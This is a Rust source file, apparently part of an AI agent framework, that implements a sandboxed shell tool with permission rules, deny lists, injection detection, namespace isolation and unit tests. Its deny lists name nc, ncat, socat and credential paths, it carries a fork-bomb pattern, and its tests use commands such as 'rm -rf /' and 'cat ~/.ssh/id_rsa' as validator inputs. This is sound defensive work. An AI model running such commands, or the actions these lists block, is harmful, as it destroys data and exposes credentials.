    /// Wildcard match (e.g., "docker * run" matches "docker compose run")
    Wildcard(String),
}

impl PermissionRule {
    /// Parse a permission rule string into a structured rule.
    pub fn parse(rule: &str) -> Self {
        let trimmed = rule.trim();
        // Legacy prefix syntax: "command:*"
        if let Some(prefix) = trimmed.strip_suffix(":*") {
            return PermissionRule::Prefix(prefix.to_string());
        }
        // Wildcard: contains unescaped *
        if contains_unescaped_wildcard(trimmed) {
            return PermissionRule::Wildcard(trimmed.to_string());
        }
        // Exact match — resolve escape sequences (\* → *, \\ → \)
        let resolved = resolve_escapes(trimmed);
        PermissionRule::Exact(resolved)
    }

    /// Check if this rule matches a given command.
    pub fn matches(&self, command: &str) -> bool {
        match self {
            PermissionRule::Exact(expected) => command.trim() == expected.as_str(),
            PermissionRule::Prefix(prefix) => {
                let cmd = command.trim();
                cmd == prefix.as_str() || cmd.starts_with(&format!("{prefix} "))
            }
            PermissionRule::Wildcard(pattern) => match_wildcard(pattern, command.trim()),
        }
    }
}

/// Resolve escape sequences in a rule string: \* → *, \\ → \.
fn resolve_escapes(s: &str) -> String {
    let mut result = String::with_capacity(s.len());
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'\\' && i + 1 < bytes.len() {
            match bytes[i + 1] {
                b'*' => { result.push('*'); i += 2; continue; }
                b'\\' => { result.push('\\'); i += 2; continue; }
                _ => {}
            }
        }
        result.push(bytes[i] as char);
        i += 1;
    }
    result
}

/// Check if a string contains unescaped wildcards (not part of `:*`).
fn contains_unescaped_wildcard(s: &str) -> bool {
    let bytes = s.as_bytes();
    for i in 0..bytes.len() {
        if bytes[i] == b'*' {
            // Count preceding backslashes
            let mut bs = 0;
            let mut j = i;
            while j > 0 && bytes[j - 1] == b'\\' {
                bs += 1;
                j -= 1;
            }
            if bs % 2 == 0 {
                return true;
            }
        }
    }
    false
}

/// Match a command against a wildcard pattern.
/// `*` matches any sequence of characters. `\*` matches literal `*`.
fn match_wildcard(pattern: &str, command: &str) -> bool {
    let regex_str = build_wildcard_regex(pattern);
    regex::Regex::new(&regex_str)
        .map(|re| re.is_match(command))
        .unwrap_or(false)
}

/// Build a regex from a wildcard pattern.
fn build_wildcard_regex(pattern: &str) -> String {
    let mut result = String::from("^");
    let bytes = pattern.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'\\' && i + 1 < bytes.len() {
            if bytes[i + 1] == b'*' {
                result.push_str(r"\*");
                i += 2;
                continue;
            } else if bytes[i + 1] == b'\\' {
                result.push_str(r"\\");
                i += 2;
                continue;
            }
        }
        if bytes[i] == b'*' {
            result.push_str(".*");
        } else {
            let ch = bytes[i] as char;
            if ".+?^${}()|[]".contains(ch) {
                result.push('\\');
            }
            result.push(ch);
        }
        i += 1;
    }
    result.push('$');
    result
}

/// Strip safe wrapper commands (timeout, nice, nohup, etc.) and safe env var
/// prefixes from a command before permission matching.
/// Returns the normalized command for rule matching.
pub fn strip_safe_wrappers(command: &str) -> String {
    let mut stripped = command.trim().to_string();
    let env_var_re = regex::Regex::new(r"^([A-Za-z_][A-Za-z0-9_]*)=([A-Za-z0-9_./:\-]+)\s+")
        .unwrap_or_else(|_| regex::Regex::new(r"x^").unwrap());

    // Iteratively strip env vars and wrappers until stable
    loop {
        let prev = stripped.clone();

        // Strip safe env vars (not binary-hijack vars)
        while let Some(m) = env_var_re.find(&stripped) {
            let var_name = stripped[..m.end()]
                .split('=')
                .next()
                .unwrap_or("");
            if BINARY_HIJACK_VARS.contains(&var_name) {
                break;
            }
            stripped = stripped[m.end()..].to_string();
        }

        // Strip wrapper commands
        let tokens: Vec<&str> = stripped.split_whitespace().collect();
        if let Some(&first) = tokens.first() {
            let base = first.rsplit('/').next().unwrap_or(first);
            if SAFE_WRAPPERS.contains(&base) {
                // Find where the actual command starts (skip wrapper + its args)
                let rest = skip_wrapper_args(base, &tokens[1..]);
                stripped = rest;
            }
        }

        if stripped == prev {
            break;
        }
    }

    stripped
}

/// Skip wrapper command arguments and return the remaining command.
fn skip_wrapper_args(wrapper: &str, args: &[&str]) -> String {
    match wrapper {
        "timeout" => {
            // Skip flags and duration, return the rest
            let mut i = 0;
            while i < args.len() {
                let arg = args[i];
                if arg == "--" { i += 1; break; }
                if arg.starts_with('-') {
                    // flags like --kill-after, -k, -s with values
                    if matches!(arg, "-k" | "-s" | "--kill-after" | "--signal") {
                        i += 2; // skip flag + value
                    } else {
                        i += 1;
                    }
                } else {
                    // This is the duration; skip it and take the rest
                    i += 1;
                    break;
                }
            }
            args[i..].join(" ")
        }
        "nice" => {
            let mut i = 0;
            while i < args.len() {
                let arg = args[i];
                if arg == "--" { i += 1; break; }
                if arg == "-n" { i += 2; continue; }
                if arg.starts_with('-') && arg.chars().skip(1).all(|c| c.is_ascii_digit()) {
                    i += 1; continue;
                }
                break;
            }
            args[i..].join(" ")
        }
        "env" => {
            // env strips env vars and runs the command
            let mut i = 0;
            let env_re = regex::Regex::new(r"^[A-Za-z_][A-Za-z0-9_]*=").unwrap();
            while i < args.len() {
                if args[i] == "--" { i += 1; break; }
                if args[i].starts_with('-') { i += 1; continue; }
                if env_re.is_match(args[i]) { i += 1; continue; }
                break;
            }
            args[i..].join(" ")
        }
        // time, nohup, stdbuf: skip just the wrapper name
        _ => args.join(" "),
    }
}

/// Check if a command has a binary-hijack env var prefix that should block execution.
pub fn has_binary_hijack_prefix(command: &str) -> Option<String> {
    let env_var_re = regex::Regex::new(r"^([A-Za-z_][A-Za-z0-9_]*)=")
        .unwrap_or_else(|_| regex::Regex::new(r"x^").unwrap());

    let trimmed = command.trim();
    let mut remaining = trimmed;

    while let Some(m) = env_var_re.find(remaining) {
        let var_name = &remaining[..m.end() - 1]; // exclude '='
        if BINARY_HIJACK_VARS.contains(&var_name) {
            return Some(format!(
                "binary hijack attempt: {var_name}= prefix modifies critical execution environment"
            ));
        }
        // Skip past this env var assignment
        if let Some(space_pos) = remaining[m.end()..].find(char::is_whitespace) {
            remaining = remaining[m.end() + space_pos..].trim_start();
        } else {
            break;
        }
    }
    None
}

// ─── sed → EditFile Conversion ──────────────────────────────────────────────

/// Information extracted from a `sed -i` edit command.
#[derive(Debug, Clone, PartialEq)]
pub struct SedEditInfo {
    /// The file path being edited.
    pub file_path: String,
    /// The search pattern (regex).
    pub pattern: String,
    /// The replacement string.
    pub replacement: String,
    /// Substitution flags (g, i, etc.).
    pub flags: String,
}

/// Parse a sed in-place edit command and extract substitution info.
/// Returns None if the command is not a valid simple `sed -i 's/old/new/flags' file`.
pub fn parse_sed_edit(command: &str) -> Option<SedEditInfo> {
    let trimmed = command.trim();
    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
    if tokens.is_empty() {
        return None;
    }

    let base = tokens[0].rsplit('/').next().unwrap_or(tokens[0]);
    if base != "sed" {
        return None;
    }

    let args = &tokens[1..];
    let mut has_in_place = false;
    let mut expression: Option<&str> = None;
    let mut file_path: Option<&str> = None;

    let mut i = 0;
    while i < args.len() {
        let arg = args[i];

        // Handle -i flag
        if arg == "-i" || arg == "--in-place" {
            has_in_place = true;
            i += 1;
            // Check for backup suffix (macOS style: -i '' or -i.bak)
            if i < args.len() && !args[i].starts_with('-') &&
               (args[i].is_empty() || args[i].starts_with('.')) {
                i += 1; // skip backup suffix
            }
            continue;
        }
        if arg.starts_with("-i") {
            has_in_place = true;
            i += 1;
            continue;
        }

        // Extended regex flags
        if arg == "-E" || arg == "-r" || arg == "--regexp-extended" {
            i += 1;
            continue;
        }

        // Expression flag
        if arg == "-e" || arg == "--expression" {
            if i + 1 < args.len() {
                if expression.is_some() { return None; } // multiple expressions not supported
                expression = Some(args[i + 1]);
                i += 2;
                continue;
            }
            return None;
        }

        // Unknown flags
        if arg.starts_with('-') {
            return None;
        }

        // Positional arguments
        if expression.is_none() {
            expression = Some(arg);
        } else if file_path.is_none() {
            file_path = Some(arg);
        } else {
            return None; // multiple files not supported
        }
        i += 1;
    }

    if !has_in_place {
        return None;
    }
    let expr = expression?;
    let file = file_path?;

    // Parse s/pattern/replacement/flags
    parse_substitution_expr(expr).map(|(pattern, replacement, flags)| SedEditInfo {
        file_path: file.trim_matches(|c| c == '\'' || c == '"').to_string(),
        pattern,
        replacement,
        flags,
    })
}

/// Parse a sed substitution expression like `s/old/new/g`.
/// Supports different delimiters (the character after 's').
fn parse_substitution_expr(expr: &str) -> Option<(String, String, String)> {
    let trimmed = expr.trim_matches(|c| c == '\'' || c == '"');
    if !trimmed.starts_with('s') || trimmed.len() < 4 {
        return None;
    }

    let delimiter = trimmed.as_bytes()[1] as char;
    let rest = &trimmed[2..];

    let mut pattern = String::new();
    let mut replacement = String::new();
    let mut flags = String::new();
    let mut state = 0u8; // 0=pattern, 1=replacement, 2=flags

    let bytes = rest.as_bytes();
    let mut j = 0;
    while j < bytes.len() {
        let ch = bytes[j] as char;

        if ch == '\\' && j + 1 < bytes.len() {
            let escaped = &rest[j..j + 2];
            match state {
                0 => pattern.push_str(escaped),
                1 => replacement.push_str(escaped),
                _ => flags.push_str(escaped),
            }
            j += 2;
            continue;
        }

        if ch == delimiter {
            if state < 2 {
                state += 1;
            } else {
                return None; // extra delimiter
            }
            j += 1;
            continue;
        }

        match state {
            0 => pattern.push(ch),
            1 => replacement.push(ch),
            _ => flags.push(ch),
        }
        j += 1;
    }

    if state < 1 {
        return None; // didn't find enough delimiters
    }

    // Validate flags
    if !flags.chars().all(|c| "gpimIM123456789".contains(c)) {
        return None;
    }

    Some((pattern, replacement, flags))
}

/// Generate an EditFileTool suggestion from a parsed sed command.
pub fn sed_to_edit_suggestion(info: &SedEditInfo) -> String {
    let escaped_pattern = info.pattern
        .replace('\\', "\\\\")
        .replace('/', "\\/");
    let escaped_replacement = info.replacement
        .replace('\\', "\\\\")
        .replace('/', "\\/");

    format!(
        "Instead of sed -i, use the edit_file tool for safer file editing:\n\
         \n\
         File: {}\n\
         Search (regex): {}\n\
         Replace with: {}\n\
         Flags: {}\n\
         \n\
         Suggested tool call:\n\
         {{\"tool\": \"edit_file\", \"path\": \"{}\", \"old_string\": \"<match of {}>\", \"new_string\": \"{}\"}}",
        info.file_path,
        info.pattern,
        info.replacement,
        if info.flags.is_empty() { "first match" } else { &info.flags },
        info.file_path,
        escaped_pattern,
        escaped_replacement,
    )
}

/// Zsh-specific dangerous commands that can bypass shell security.
const ZSH_DANGEROUS_COMMANDS: &[&str] = &[
    "zmodload", "emulate",
    "sysopen", "sysread", "syswrite", "sysseek",
    "zpty", "ztcp", "zsocket",
    "zf_rm", "zf_mv", "zf_ln", "zf_chmod", "zf_chown", "zf_mkdir", "zf_rmdir", "zf_chgrp",
];

/// Strip single-quoted regions from a command string.
/// Content inside single quotes is not subject to shell expansion, so
/// patterns within them are safe and should not trigger injection detection.
fn strip_single_quoted_regions(s: &str) -> String {
    let mut result = String::with_capacity(s.len());
    let mut in_single_quote = false;

    for ch in s.chars() {
        if ch == '\'' && !in_single_quote {
            in_single_quote = true;
        } else if ch == '\'' && in_single_quote {
            in_single_quote = false;
        } else if !in_single_quote {
            result.push(ch);
        }
    }
    result
}

/// Check for unescaped backtick command substitution.
/// Returns true if the string contains backticks that are not preceded by `\`.
fn contains_unescaped_backticks(s: &str) -> bool {
    let bytes = s.as_bytes();
    for i in 0..bytes.len() {
        if bytes[i] == b'`' && (i == 0 || bytes[i - 1] != b'\\') {
            return true;
        }
    }
    false
}

// --- Sandboxed Shell Execution ---

/// Policy-driven sandbox configuration for shell command execution.
#[derive(Debug, Clone)]
pub struct ShellSandboxConfig {
    /// Maximum execution time in seconds.
    pub timeout_secs: u64,
    /// Maximum output size in bytes before truncation.
    pub max_output_bytes: usize,
    /// Commands that are always blocked (matched against the first token).
    pub denied_commands: Vec<String>,
    /// If non-empty, only these commands are allowed (whitelist mode).
    pub allowed_commands: Vec<String>,
    /// Deny patterns: each is a regex applied to the full command string.
    /// Use `\b` word boundaries to avoid false positives like `eval ` matching `evaluate`.
    pub denied_patterns: Vec<String>,
    /// Compiled deny-pattern regexes (built from `denied_patterns`).
    denied_regexes: Vec<(regex::Regex, String)>,
    /// Allowed working directories. If empty, any directory is allowed.
    pub allowed_dirs: Vec<String>,
    /// Environment variables to strip before execution.
    pub strip_env_vars: Vec<String>,
    /// Whether to enable Linux namespace isolation (requires unshare permissions).
    pub use_namespace: bool,
    /// Read-only filesystem paths (for namespace mode bind mounts).
    pub readonly_paths: Vec<String>,
    /// Writable filesystem paths (for namespace mode bind mounts).
    /// These get mounted read-write inside the namespace.
    pub writable_paths: Vec<String>,
    /// Whether to isolate network (create a new network namespace).
    pub isolate_network: bool,
    /// Allowed network hosts (only effective when isolate_network is true).
    /// If empty and isolate_network is true, all network is blocked.
    pub allowed_hosts: Vec<String>,
}

impl ShellSandboxConfig {
    fn compile_denied_regexes(patterns: &[String]) -> Vec<(regex::Regex, String)> {
        patterns
            .iter()
            .filter_map(|p| {
                regex::Regex::new(p)
                    .map(|re| (re, p.clone()))
                    .map_err(|e| {
                        tracing::warn!(
                            pattern = %p,
                            error = %e,
                            "sandbox: skipped invalid denied_pattern regex"
                        );
                    })
                    .ok()
            })
            .collect()
    }
}

fn default_denied_patterns() -> Vec<String> {
    vec![
        r"> /dev/".into(),
        r"\| /dev/".into(),
        r":\(\)\{ :\|:& \};:".into(),
        r"\beval\b".into(),
        r"/etc/shadow".into(),
        r"/etc/passwd".into(),
        r"~/\.ssh\b".into(),
        r"\.ssh/".into(),
    ]
}

impl Default for ShellSandboxConfig {
    fn default() -> Self {
        let patterns = default_denied_patterns();
        let denied_regexes = Self::compile_denied_regexes(&patterns);
        Self {
            timeout_secs: 300,
            max_output_bytes: 65536,
            denied_commands: vec![
                // rm, rmdir, chmod, chown, chgrp are handled by the dangerous_ops policy
                // (deny/confirm/allow) rather than hard-blocked here.
                "mkfs".into(),
                "dd".into(),
                "shutdown".into(),
                "reboot".into(),
                "poweroff".into(),
                "halt".into(),
                // kill/killall/pkill removed — allow process management for dev workflows
                "mount".into(),
                "umount".into(),
                "iptables".into(),
                "ip6tables".into(),
                "nft".into(),
                "useradd".into(),
                "userdel".into(),
                "usermod".into(),
                "passwd".into(),
                "su".into(),
                "sudo".into(),
                "crontab".into(),
                "nc".into(),
                "ncat".into(),
                "socat".into(),
            ],
            allowed_commands: Vec::new(),
            denied_patterns: patterns,
            denied_regexes,
            allowed_dirs: Vec::new(),
            strip_env_vars: vec![
                "AWS_SECRET_ACCESS_KEY".into(),
                "AWS_SESSION_TOKEN".into(),
                "GITHUB_TOKEN".into(),
                "GH_TOKEN".into(),
                "NPM_TOKEN".into(),
                "DATABASE_URL".into(),
                "PRIVATE_KEY".into(),
            ],
            use_namespace: false,
            readonly_paths: Vec::new(),
            writable_paths: Vec::new(),
            isolate_network: false,
            allowed_hosts: Vec::new(),
        }
    }
}

/// Sandboxed shell execution tool with policy enforcement.
pub struct SandboxedShellTool {
    config: ShellSandboxConfig,
}

impl SandboxedShellTool {
    pub fn new(mut config: ShellSandboxConfig) -> Self {
        if config.denied_regexes.is_empty() && !config.denied_patterns.is_empty() {
            config.denied_regexes =
                ShellSandboxConfig::compile_denied_regexes(&config.denied_patterns);
        }
        Self { config }
    }

    /// Build the namespace-isolated command using unshare + bind mounts.
    /// Returns None if namespace isolation is not available (graceful degradation).
    #[cfg(not(windows))]
    fn build_namespace_command(&self, command: &str, shell: &str) -> Option<tokio::process::Command> {
        if !self.config.use_namespace {
            return None;
        }

        // Check if unshare is available
        if !namespace_available() {
            tracing::warn!("namespace isolation requested but unshare not available; falling back to non-isolated execution");
            return None;
        }

        let mut args: Vec<String> = Vec::new();

        // Always create mount and PID namespaces
        args.push("--mount".into());
        args.push("--pid".into());
        args.push("--fork".into());

        // Optional network namespace isolation
        if self.config.isolate_network {
            args.push("--net".into());
        }

        // Map current user to root inside namespace (allows bind mounts without root)
        args.push("--map-root-user".into());

        args.push("--".into());

        // Build a setup script that creates bind mounts then executes the command
        let setup_script = self.build_namespace_setup_script(command, shell);
        args.push(shell.into());
        args.push("-c".into());
        args.push(setup_script);

        let mut cmd = tokio::process::Command::new("unshare");
        cmd.args(&args);
        Some(cmd)
    }

    /// Build the shell script that sets up bind mounts inside the namespace.
    #[cfg(not(windows))]
    fn build_namespace_setup_script(&self, user_command: &str, shell: &str) -> String {
        let mut script = String::new();
        script.push_str("set -e\n");

        // Remount root as private so our mounts don't propagate
        script.push_str("mount --make-rprivate /\n");

        // Mount readonly_paths as read-only
        for path in &self.config.readonly_paths {
            script.push_str(&format!(
                "mount --bind '{p}' '{p}' 2>/dev/null && mount -o remount,bind,ro '{p}' 2>/dev/null || true\n",
                p = path.replace('\'', "'\\''")
            ));
        }

        // Mount writable_paths as read-write (explicit bind to ensure they survive ro remounts)
        for path in &self.config.writable_paths {
            script.push_str(&format!(
                "mount --bind '{p}' '{p}' 2>/dev/null || true\n",
                p = path.replace('\'', "'\\''")
            ));
        }

        // Execute the user's command
        script.push_str(&format!(
            "exec {shell} -c {cmd}\n",
            shell = shell,
            cmd = shell_quote(user_command)
        ));

        script
    }

    fn validate_command(&self, command: &str) -> Result<(), String> {
        let trimmed = command.trim();
        if trimmed.is_empty() {
            return Err(
                "Sandbox shell command is empty after trimming whitespace. \
                 Provide a non-empty sh -c snippet, e.g. {\"command\": \"echo ok\"}."
                    .into(),
            );
        }

        self.validate_injection_patterns(trimmed)?;

        // Block binary hijack env var prefixes (PATH=, LD_PRELOAD=, etc.)
        if let Some(reason) = has_binary_hijack_prefix(trimmed) {
            return Err(reason);
        }

        // Strip safe wrappers/env vars for deny list matching
        let normalized = strip_safe_wrappers(trimmed);
        let first_token = normalized.split_whitespace().next().unwrap_or("");
        let base_cmd = first_token.rsplit('/').next().unwrap_or(first_token);

        if !self.config.allowed_commands.is_empty()
            && !self.config.allowed_commands.iter().any(|c| c == base_cmd) {
                return Err(format!(
                    "Sandbox allowlist rejects first command '{base_cmd}'. \
                     Allowed base commands: {}. \
                     Rewrite the pipeline using only those binaries, or ask the operator to widen allowed_commands.",
                    self.config.allowed_commands.join(", ")
                ));
            }

        if self.config.denied_commands.iter().any(|c| c == base_cmd) {
            return Err(format!(
                "Sandbox policy blocks base command '{base_cmd}' (classified as high-risk). \
                 Use read_file/write_file/list_directory or narrower tools instead of shell for that action, or ask the operator to change denied_commands if this block is a false positive."
            ));
        }

        for (re, pattern) in &self.config.denied_regexes {
            if re.is_match(trimmed) {
                return Err(format!(
                    "Sandbox denied_pattern matched regex '{pattern}' in the command text. \
                     Remove that construct (often sensitive paths or shell tricks) and use approved tools; if this is a false positive, ask the operator to tune denied_patterns."
                ));
            }
        }

        for part in trimmed
            .split("&&")
            .chain(trimmed.split("||"))
            .chain(trimmed.split(';'))
        {
            let sub = part.trim();
            if sub.is_empty() {
                continue;
            }
            // Strip wrappers from each segment before checking deny list
            let sub_normalized = strip_safe_wrappers(sub);
            let sub_cmd = sub_normalized.split_whitespace().next().unwrap_or("");
            let sub_base = sub_cmd.rsplit('/').next().unwrap_or(sub_cmd);
            if sub_base.is_empty() {
                continue;
            }
            if self.config.denied_commands.iter().any(|c| c == sub_base) {
                return Err(format!(
                    "Sandbox detected blocked base command '{sub_base}' inside a chained segment (split on &&, ||, or ;). \
                     Every segment must pass the same allow/deny rules—remove or replace the risky segment, or split into separate shell_exec calls."
                ));
            }
            if ZSH_DANGEROUS_COMMANDS.contains(&sub_base) {
                return Err(format!(
                    "Sandbox blocks Zsh-specific dangerous command '{sub_base}'. \
                     These commands can bypass security via module loading or pseudo-terminal execution."
                ));
            }
        }

        Ok(())
    }

    /// Detect shell injection patterns: command substitution, process
    /// substitution, and dangerous parameter expansion.
    ///
    /// These patterns are blocked unconditionally in sandboxed mode because
    /// they allow arbitrary command execution inside otherwise-safe commands.
    fn validate_injection_patterns(&self, command: &str) -> Result<(), String> {
        let unquoted = strip_single_quoted_regions(command);

        for &(pattern, description) in INJECTION_PATTERNS {
            if let Ok(re) = regex::Regex::new(pattern) {
                if re.is_match(&unquoted) {
                    return Err(format!(
                        "Sandbox blocks {description} in command. \
                         These constructs allow arbitrary code execution inside shell commands. \
                         Rewrite without shell injection patterns, or use dedicated tools."
                    ));
                }
            }
        }

        if contains_unescaped_backticks(&unquoted) {
            return Err(
                "Sandbox blocks backtick command substitution. \
                 Use $() syntax inside single-quotes if you need literal backticks for display, \
                 or restructure the command to avoid embedded execution."
                    .into(),
            );
        }

        Ok(())
    }

    fn validate_dir(&self, dir: &str) -> Result<(), String> {
        if self.config.allowed_dirs.is_empty() {
            return Ok(());
        }
        let canonical = std::path::Path::new(dir)
            .canonicalize()
            .map_err(|e| {
                format!(
                    "Sandbox working_dir '{dir}' could not be canonicalized: {e}. \
                     Pass an existing directory the gateway user can stat, or omit working_dir if policy permits."
                )
            })?;
        let is_allowed = self.config.allowed_dirs.iter().any(|d| {
            let allowed = std::path::Path::new(d.as_str());
            let allowed_canonical = allowed.canonicalize().unwrap_or_else(|_| allowed.to_path_buf());
            canonical.starts_with(&allowed_canonical)
        });
        if is_allowed {
            Ok(())
        } else {
            Err(format!(
                "Sandbox working_dir '{dir}' resolves outside allowed directory roots: {}. \
                 Choose a cwd inside one of those roots, or omit working_dir when configuration allows any cwd.",
                self.config.allowed_dirs.join(", ")
            ))
        }
    }
}

#[async_trait]
impl Tool for SandboxedShellTool {
    fn kind(&self) -> ToolKind { ToolKind::Execute }
    fn name(&self) -> &str {
        "shell_exec"
    }

    fn max_result_size_chars(&self) -> usize { 30_000 }

    fn description(&self) -> &str {
        "Sandboxed shell_exec — commands validated against allow/deny rules before execution. \
         Default shell: bash (Unix) or cmd.exe (Windows). \
         Use the 'shell' parameter to choose: 'bash'/'sh' on Unix, 'cmd'/'powershell' on Windows. \
         Set is_background=true for dev servers, watchers, and processes you don't need to wait for; \
         set is_background=false for commands you want to wait for (timeout: 5 minutes). \
         Blocked commands (sudo, mkfs, dd, etc.) return SANDBOX BLOCKED. \
         Destructive ops (rm, chmod) follow the dangerous_ops security policy. \
         For very long tasks (>5min), use background mode with output redirection, \
         then poll with 'sleep N' + 'read_file' to monitor progress."
    }

    fn prompt(&self) -> String {
        let mut prompt = SHELL_TOOL_PROMPT.to_string();
        prompt.push_str("\n\n## Command Sandbox\n\n\
By default, your command will be run in a sandbox. This sandbox controls \
which directories and network hosts commands may access or modify.\n\n\
Sandbox restrictions:\n");

        if !self.config.allowed_dirs.is_empty() {
            prompt.push_str(&format!(
                "- Filesystem write allowed directories: {}\n",
                self.config.allowed_dirs.join(", ")
            ));
        }
        if !self.config.denied_patterns.is_empty() {
            prompt.push_str(&format!(
                "- Denied command patterns: {}\n",
                self.config.denied_patterns.join(", ")
            ));
        }

        prompt.push_str("\n\
- Commands validated against allow/deny rules before execution\n\
- Blocked commands (sudo, su, mkfs, dd, fdisk, etc.) return SANDBOX BLOCKED\n\
- For temporary files, use the `$TMPDIR` environment variable — do NOT use `/tmp` directly\n\
- If a command fails due to sandbox restrictions, work with the user to adjust sandbox settings\n\
- Do NOT attempt to bypass the sandbox");

        prompt
    }

    fn parameters_schema(&self) -> ToolParameterSchema {
        shell_parameter_schema(true)
    }

    async fn execute(&self, arguments: &str) -> ToolResult {
        let args: serde_json::Value = match serde_json::from_str(arguments) {
            Ok(v) => v,
            Err(e) => return ToolResult::err(format!(
                "sandboxed shell_exec arguments are not valid JSON: {e}. \
                 Pass {{\"command\": \"...\", \"is_background\": false}} with optional \"working_dir\", \"description\"."
            )),
        };

        let command = match args.get("command").and_then(|v| v.as_str()) {
            Some(s) => s,
            None => return ToolResult::err(
                "sandboxed shell_exec is missing string field 'command'. \
                 Example: {\"command\": \"echo ok\", \"is_background\": false}."
                    .to_string(),
            ),
        };

        let is_background = args
            .get("is_background")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        if let Err(reason) = self.validate_command(command) {
            return ToolResult::err(format!(
                "SANDBOX BLOCKED: {reason} \
                 Adjust the command to comply, or use non-shell tools (read_file, write_file, web_fetch) where appropriate."
            ));
        }

        if let Err(reason) = validate_command_paths(command, &self.config.allowed_dirs) {
            return ToolResult::err(format!(
                "SANDBOX BLOCKED: {reason} \
                 Use absolute paths within the allowed workspace, or use dedicated file tools."
            ));
        }

        // Detect sed -i and suggest EditFileTool instead
        if let Some(sed_info) = parse_sed_edit(command) {
            let suggestion = sed_to_edit_suggestion(&sed_info);
            return ToolResult::err(format!(
                "SANDBOX SUGGESTION: sed -i detected. {suggestion}"
            ));
        }

        let user_confirmed = args
            .get("confirmed")
            .and_then(|v| v.as_bool())
            .unwrap_or(false);

        if !user_confirmed {
            match fastclaw_security::dangerous_ops::check_dangerous_command(command) {
                Ok(()) => {}
                Err(fastclaw_security::dangerous_ops::CheckResult::Denied(msg))
                | Err(fastclaw_security::dangerous_ops::CheckResult::NeedsConfirmation(msg)) => {
                    return ToolResult::needs_confirm(format!(
                        "This command requires user confirmation: {msg}"
                    ));
                }
            }
        }

        if let Some(dir) = args.get("working_dir").and_then(|v| v.as_str()) {
            if let Err(reason) = self.validate_dir(dir) {
                return ToolResult::err(format!(
                    "SANDBOX BLOCKED: {reason} \
                     Choose a working_dir under an allowed root or omit working_dir if permitted."
                ));
            }
        }

        let shell_hint = args.get("shell").and_then(|v| v.as_str());
        let mut cmd = {
            #[cfg(not(windows))]
            {
                let shell = match shell_hint {
                    Some("sh") => "sh",
                    Some("bash") => "bash",
                    _ => preferred_shell(),
                };
                if let Some(ns_cmd) = self.build_namespace_command(command, shell) {
                    ns_cmd
                } else {
                    build_shell_command(command, shell_hint)
                }
            }
            #[cfg(windows)]
            {
                build_shell_command(command, shell_hint)
            }
        };

        if let Some(dir) = args.get("working_dir").and_then(|v| v.as_str()) {
            cmd.current_dir(dir);
        }

        for var in &self.config.strip_env_vars {
            cmd.env_remove(var);
        }
        cmd.env("FASTCLAW_AGENT", "1");

        cmd.stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped());

        let timeout = tokio::time::Duration::from_secs(self.config.timeout_secs);
        let max_out = self.config.max_output_bytes;

        if is_background {
            match cmd.spawn() {
                Ok(child) => {
                    let pid = child.id();
                    let desc = args.get("description").and_then(|v| v.as_str()).unwrap_or(command);
                    ToolResult::ok(
                        serde_json::json!({
                            "background": true,
                            "pid": pid,
                            "command": command,
                            "description": desc,
                            "sandboxed": true,
                        })
                        .to_string(),
                    )
                }
                Err(e) => ToolResult::err(format!("sandboxed shell_exec spawn failed: {e}")),
            }
        } else {
            match tokio::time::timeout(timeout, cmd.output()).await {
                Ok(Ok(output)) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);
                    let code = output.status.code().unwrap_or(-1);

                    #[cfg(unix)]
                    let signal = {
                        use std::os::unix::process::ExitStatusExt;
                        output.status.signal()
                    };
                    #[cfg(not(unix))]
                    let signal: Option<i32> = None;

                    let (llm_out, terminal_file) = process_shell_output(command, &stdout, &stderr, code);

                    let full_display = serde_json::json!({
                        "exit_code": code,
                        "stdout": truncate_output(&stdout, max_out),
                        "stderr": truncate_output(&stderr, max_out),
                        "signal": signal,
                        "sandboxed": true,
                        "terminal_file": terminal_file,
                    }).to_string();

                    if code == 0 {
                        ToolResult::ok_split(llm_out, full_display)
                    } else {
                        ToolResult::err(llm_out)
                    }
                }
                Ok(Err(e)) => ToolResult::err(format!(
                    "sandboxed shell_exec spawn failed: {e}"
                )),
                Err(_) => ToolResult::err(format!(
                    "sandboxed shell_exec timed out after {}s, command killed.",
                    self.config.timeout_secs
                )),
            }
        }
    }
}

#[cfg(test)]
mod sandbox_tests {
    use super::*;

    fn default_sandbox() -> SandboxedShellTool {
        SandboxedShellTool::new(ShellSandboxConfig::default())
    }

    #[test]
    fn rm_not_blocked_by_sandbox() {
        // rm is now handled by dangerous_ops policy, not the sandbox
        let tool = default_sandbox();
        assert!(tool.validate_command("rm -rf /").is_ok());
    }

    #[test]
    fn blocks_sudo() {
        let tool = default_sandbox();
        assert!(tool.validate_command("sudo apt install foo").is_err());
    }

    #[test]
    fn blocks_chained_dangerous() {
        let tool = default_sandbox();
        // rm and kill are no longer blocked by sandbox (handled by dangerous_ops policy)
        assert!(tool.validate_command("echo hello && rm file.txt").is_ok());
        // sudo is still blocked
        assert!(tool.validate_command("ls; sudo rm -rf /").is_err());
    }

    #[test]
    fn blocks_denied_patterns() {
        let tool = default_sandbox();
        assert!(tool.validate_command("cat /etc/shadow").is_err());
        assert!(tool.validate_command("cat ~/.ssh/id_rsa").is_err());
    }

    #[test]
    fn allows_safe_commands() {
        let tool = default_sandbox();
        assert!(tool.validate_command("echo hello").is_ok());
        assert!(tool.validate_command("ls -la").is_ok());
        assert!(tool.validate_command("cat README.md").is_ok());
        assert!(tool.validate_command("python3 script.py").is_ok());
        assert!(tool.validate_command("git status").is_ok());
        assert!(tool.validate_command("cargo build").is_ok());
    }

    #[test]
    fn allowlist_mode() {
        let config = ShellSandboxConfig {
            allowed_commands: vec!["ls".into(), "echo".into(), "cat".into()],
            ..Default::default()
        };
        let tool = SandboxedShellTool::new(config);
        assert!(tool.validate_command("ls -la").is_ok());
        assert!(tool.validate_command("echo hi").is_ok());
        assert!(tool.validate_command("python3 foo.py").is_err());
    }

    #[test]
    fn dir_restriction() {
        let config = ShellSandboxConfig {
            allowed_dirs: vec!["/tmp".into()],
            ..Default::default()
        };
        let tool = SandboxedShellTool::new(config);
        assert!(tool.validate_dir("/tmp").is_ok());
        assert!(tool.validate_dir("/etc").is_err());
    }

    #[tokio::test]
    async fn executes_safe_command() {
        let tool = default_sandbox();
        let result = tool.execute(r#"{"command": "echo sandbox_test", "is_background": false}"#).await;
        assert!(result.success, "command should succeed: {}", result.output);
